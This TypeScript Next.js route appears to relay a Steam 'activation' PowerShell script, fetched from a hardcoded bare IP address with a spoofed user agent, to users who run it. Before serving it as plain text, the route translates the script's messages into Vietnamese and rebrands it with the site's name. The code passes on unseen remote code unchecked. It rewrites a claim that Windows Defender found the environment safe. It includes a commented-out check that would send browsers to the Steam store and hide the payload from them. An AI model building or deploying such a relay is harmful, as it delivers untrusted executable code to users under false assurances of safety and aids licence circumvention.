import { env } from '@/config'

export const revalidate = 1800
const commandTemp =
  /Invoke-WebRequest\s+-Uri\s+"(http:\/\/\d+\.\d+\.\d+\.\d+\/uploads\/[^"]+)".*?-Headers\s+\$headers;/gm

/**
 * Translates PowerShell script content from Chinese to Vietnamese
 * @param inputContent - The original PowerShell script content (string)
 * @param outputPath - Optional path to save the translated content
 * @returns The translated PowerShell script content
 */
export function translatePowerShellScript(inputContent: string) {
  // Translation mapping from Chinese to Vietnamese
  const translations: Record<string, string> = {
    '激活进程准备中，请稍候...': `Đang chuẩn bị quá trình kích hoạt...
    Cảm ơn đã tin tưởng sử dụng dịch vụ của ${env.NEXT_PUBLIC_SITE_NAME}`,
    'Steam 可能没有正确安装，请重新安装 Steam 后再试':
      'Có thể Steam chưa được cài đặt đúng cách, vui lòng cài đặt lại Steam và thử lại',
    请使用管理员模式运行: 'Vui lòng chạy với quyền quản trị viên',
    '已通过 Windows Defender 检测，环境安全': 'Đã cài đặt môi trường an toàn',
    '主进程 $exePath 丢失，安装失败': 'Tiến trình chính $exePath bị thiếu, cài đặt thất bại',
    '激活进程准备就绪，Steam 打开中，请稍候...':
      'Quá trình kích hoạt đã sẵn sàng, Steam đang mở, vui lòng đợi...',
    '本窗口将在 $i 秒后关闭...': 'Cửa sổ này sẽ đóng sau $i giây...',
    '发生错误：': 'Đã xảy ra lỗi：',
    '正在准备激活过程，请耐心等待...':
      'Đang chuẩn bị quá trình kích hoạt, vui lòng kiên nhẫn chờ đợi...',
  }

  // Function to check if a string contains Chinese characters
  function containsChinese(text: string | undefined): boolean {
    if (!text) return false
    return /[\u4E00-\u9FFF]/.test(text)
  }

  try {
    // Make a copy of the content to work with
    let content = inputContent

    // First, try direct replacements from our dictionary
    Object.keys(translations).forEach((chineseText) => {
      if (content.includes(chineseText)) {
        const regex = new RegExp(chineseText.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g')
        content = content.replace(regex, translations[chineseText] as any)
      }
    })

    // Automatically add the waiting message after the environment safe message
    const safeEnvironmentRegex =
      /(Write-Host -NoNewline\s+"[^"]*(?:Đã cài đặt môi trường an toàn|已通过 Windows Defender 检测，环境安全)[^"]*";\s+Write-Host\s+"\[√\]"\s+-ForegroundColor\s+Green\s*(?:\r?\n|\r))/g
    const waitingMessage =
      '        Write-Host "  [STEAM] Đang chuẩn bị quá trình kích hoạt, vui lòng kiên nhẫn chờ đợi..."\r\n'

    // Check if the waiting message is already present
    if (
      !content.includes('正在准备激活过程，请耐心等待...') &&
      !content.includes('Đang chuẩn bị quá trình kích hoạt, vui lòng kiên nhẫn chờ đợi...')
    ) {
      content = content.replace(safeEnvironmentRegex, (match) => {
        return match + waitingMessage
      })
    }

    // Now look for any remaining Chinese text in Write-Host commands
    const writeHostRegex = /Write-Host\s+(?:(-NoNewline)\s+)?["']([^"']*[\u4E00-\u9FFF][^"']*)["']/g
    let match

    while ((match = writeHostRegex.exec(content)) !== null) {
      const chineseText = match[2]

      // Skip if we've already translated this text
      if (!containsChinese(chineseText)) continue
    }

    return content
  } catch (_error: unknown) {
    // Return the original content if there was an error
    return inputContent
  }
}

function extractDownloadUrl(text: string) {
  const matchWithCommand = text.match(commandTemp)
  const matchDirectUrl = matchWithCommand?.[0].match(
    /https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/uploads\/[a-zA-Z0-9.]+/,
  )
  return { command: matchWithCommand?.[0] || '', url: matchDirectUrl?.[0] || '' }
}

async function getScript() {
  try {
    const response = await fetch('http://150.158.29.244', {
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.5737',
      },
    })

    if (!response.ok) {
      throw new Error(`Failed to fetch content: ${response.status} ${response.statusText}`)
    }

    const content = await response.text()
    return { content, scriptUrl: extractDownloadUrl(content) }
  } catch (_error: unknown) {
    throw _error
  }
}

export async function GET(request: Request): Promise<Response> {
  const userAgent = request.headers.get('user-agent') || 'Unknown'
  console.log(`Request User-Agent: ${userAgent}`)

  // Redirect to Steam store if the request is not from PowerShell
  // if (!userAgent.includes('WindowsPowerShell')) {
  //   return Response.redirect('https://store.steampowered.com', 302)
  // }
  try {
    const { scriptUrl } = await getScript()
    const response = await fetch(scriptUrl.url)

    if (!response.ok) {
      throw new Error(`Failed to fetch content: ${response.status} ${response.statusText}`)
    }

    const scriptText = await response.text()
    const translatedContent = translatePowerShellScript(scriptText)

    return new Response(translatedContent, {
      headers: {
        'Content-Type': 'text/plain; charset=utf-8',
      },
    })
  } catch (_error: unknown) {
    throw _error
  }
}
